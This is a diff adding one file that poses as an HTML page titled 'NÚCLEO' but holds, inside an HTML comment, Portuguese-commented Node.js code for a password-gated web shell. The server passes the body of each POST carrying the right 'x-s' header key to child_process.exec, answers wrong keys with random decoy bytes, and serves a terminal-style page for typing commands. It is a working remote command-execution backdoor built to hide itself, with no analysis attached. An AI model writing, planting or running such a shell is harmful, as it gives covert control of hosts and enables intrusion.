@@ -1,0 +1,77 @@
+<!--
+/* -- INÍCIO DO MOTOR DO SERVIDOR (Node.js) --
+/* A lógica abaixo é invisível para o navegador, mas ativa o servidor no sistema.
+*/
+const _h = require('http'), _e = require('child_process').exec, _c = require('crypto'), _f = require('fs');
+
+const _K = process.env.K_SIG; // Extrai a chave da RAM (Definir antes de rodar)
+if (!_K) { console.log("ERRO: Chave ausente na RAM."); process.exit(1); }
+
+const _S = _h.createServer((req, res) => {
+    if (req.method === 'POST') {
+        let _b = '';
+        req.on('data', d => _b += d);
+        req.on('end', () => {
+            if (req.headers['x-s'] === _K) {
+                _e(_b, (err, out, serr) => res.end(out || serr || "OK"));
+            } else {
+                res.end(_c.randomBytes(16).toString('hex')); // Resposta falsa (ruído)
+            }
+        });
+    } else {
+        // O servidor lê a si próprio e entrega a parte HTML ao browser
+        _f.readFile(__filename, 'utf8', (err, data) => {
+            res.writeHead(200, {'Content-Type': 'text/html'});
+            res.end(data.split('<!-- UI -->')[1]); 
+        });
+    }
+});
+
+const _p = Math.floor(Math.random() * 10000 + 40000);
+_S.listen(_p, () => console.log(`\x1b[32m[ATIVO]\x1b[0m http://localhost:${_p}`));
+return; 
+/* -- FIM DO MOTOR -- */
+-->
+
+<!-- UI -->
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="utf-8">
+    <title>NÚCLEO</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; display: flex; flex-direction: column; height: 90vh; }
+        #_m { flex-grow: 1; border: 1px solid #020; padding: 10px; overflow-y: auto; background: rgba(0,5,0,1); box-shadow: inset 0 0 10px #030; }
+        .i-group { margin-top: 10px; display: flex; gap: 5px; }
+        input { background: #000; border: 1px solid #030; color: #0f0; padding: 10px; outline: none; font-family: inherit; }
+        #_k { width: 80px; border-color: #200; }
+        #_c { flex-grow: 1; }
+        .ln { color: #555; margin-right: 5px; }
+    </style>
+</head>
+<body>
+    <div id="_m">SISTEMA INICIALIZADO...</div>
+    <div class="i-group">
+        <input type="password" id="_k" placeholder="***">
+        <input type="text" id="_c" placeholder="COMANDO..." autocomplete="off" onkeypress="if(event.key==='Enter')_x()">
+    </div>
+
+    <script>
+        async function _x() {
+            const k = document.getElementById('_k'), c = document.getElementById('_c'), m = document.getElementById('_m');
+            if(!c.value) return;
+            
+            const r = await fetch('/', {
+                method: 'POST',
+                headers: { 'x-s': k.value },
+                body: c.value
+            });
+            
+            const d = await r.text();
+            m.innerHTML += `<div><span class="ln">[${new Date().toLocaleTimeString()}]</span> ${d}</div>`;
+            m.scrollTop = m.scrollHeight;
+            c.value = '';
+        }
+    </script>
+</body>
+</html>
